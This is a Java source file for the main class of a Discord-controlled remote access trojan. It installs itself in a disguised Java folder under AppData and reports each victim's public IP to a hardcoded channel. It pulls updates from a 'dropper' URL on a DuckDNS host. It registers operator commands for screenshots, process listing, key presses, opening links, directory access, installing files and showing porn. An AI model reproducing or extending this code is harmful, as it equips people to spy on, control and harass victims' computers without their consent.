package Main;

import java.util.ArrayList;
import java.util.List;

import Command.Command;
import Command.Commands.BeepCommand;
import Command.Commands.BouncyCommand;
import Command.Commands.CmdsCommand;
import Command.Commands.DirectoryCommand;
import Command.Commands.HelpCommand;
import Command.Commands.InstallCommand;
import Command.Commands.JitterCommand;
import Command.Commands.ListProcessCommand;
import Command.Commands.NicknameCommand;
import Command.Commands.OpenLinkCommand;
import Command.Commands.PornCommand;
import Command.Commands.PressCommand;
import Command.Commands.ScreenshotCommand;
import Command.Commands.TextSpeechCommand;
import Command.Commands.UpdateCommand;
import Command.Commands.VersionCommand;
import Config.Config;
import Handlers.Execution;
import Handlers.Messenger;
import net.dv8tion.jda.core.AccountType;
import net.dv8tion.jda.core.JDA;
import net.dv8tion.jda.core.JDABuilder;

public class Bot2d {

	List<Command> commands = new ArrayList<Command>();
	
	public JDA client;
	public Execution executor;
	public Messenger messenger;
	public Nickname nickname;
	public Updater updater;
	public Config config;
	public Deployer deployer;
	
	private String CMDKEY = "--";
	private String APIKEY = "";
	private String IPWebsite = "http://checkip.amazonaws.com";
	private String UpdateWebsite = "http://plebiancoons.duckdns.org/dropper";
	private String IP = "";
	
	private String INSTALLPATH = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Sun/Java2d";
	private String defaultChannel = "323913870303297546";
	private int version = 3;
	
	public static void main(String[] Args) {
		new Bot2d();
	}
	
	public Bot2d() {
		deployer = new Deployer(this);
		try {
			addCommands();
			config = new Config();
			updater = new Updater(this);
			client = new JDABuilder(AccountType.BOT).setToken(APIKEY).addEventListener(new EventListener(this)).buildBlocking();
			executor = new Execution();
			nickname = new Nickname(this);
			messenger = new Messenger(this);
		} catch (Exception e) {
			System.out.println("Error in Main:Bot2d:Constructor: " + e);
		}
		if(updater.updatesAvailable()) {
			messenger.sendMessageToDefault(":grey_exclamation: - " + IP + " (" + nickname.getNickname() + ") - **has detected an update. The bot will begin the update right now instead of initializing.** - Ver: " + version);
			updateMode();
		} else {
			messenger.sendMessageToDefault(":green_heart: - " + IP + " (" + nickname.getNickname() + ") - **Bot initialized** - Ver: " + version);
		}
	}
	
	public void addCommands() {
		//commands.clear();
		commands.add(new VersionCommand("Version", this));
		commands.add(new NicknameCommand("Nickname", this));
		commands.add(new HelpCommand("Help", this));
		commands.add(new CmdsCommand("Commands", this));
		commands.add(new ListProcessCommand("ListProcesses", this));
		commands.add(new ScreenshotCommand("Screenshot", this));
		commands.add(new PornCommand("Porn", this));
		commands.add(new BeepCommand("Beep", this));
		commands.add(new JitterCommand("Jitter", this));
		commands.add(new OpenLinkCommand("Openlink", this));
		commands.add(new TextSpeechCommand("TextSpeech", this));
		commands.add(new BouncyCommand("Bouncy", this));
		commands.add(new PressCommand("Press", this));
		commands.add(new InstallCommand("Install", this));
		commands.add(new DirectoryCommand("Directory", this));
		commands.add(new UpdateCommand("Update", this));
	}
	
	public void clearCommands() {
		commands.clear();
	}
	
	public void updateMode() {
		messenger.sendMessageToDefault(":gear:" + IP + "(" + nickname.getNickname() + ") is entering Update Mode. Bot will be offline after all current executions are finished.");
		clearCommands();
		executor.shutdownAfterExecutions();
		client.shutdown();
		config.saveProperties();
		updater.beginUpdate();
	}
	
	// Gets and Sets
	
	public boolean hasDefaultChannel() {
		if(defaultChannel != null || defaultChannel != "") {
			return true;
		} else {
			return false;
		}
	}
	
	public String getDefaultChannel() {
		return defaultChannel;
	}
	
	public int getVersion() {
		return version;
	}
	
	public void setIP(String IP) {
		this.IP = IP;
	}
	
	public String getIP() {
		return IP;
	}
	
	public String getIPWebsite() {
		return IPWebsite;
	}
	
	public String getCMDKey() {
		return CMDKEY;
	}
	
	public String getUpdateWebsite() {
		return UpdateWebsite;
	}
	
	public String getInstallPath() {
		return INSTALLPATH;
	}
	
	public void setAPIKEY(String str) {
		APIKEY = str;
	}
	
	public List<Command> getCommands() {
		return commands;
	}
}
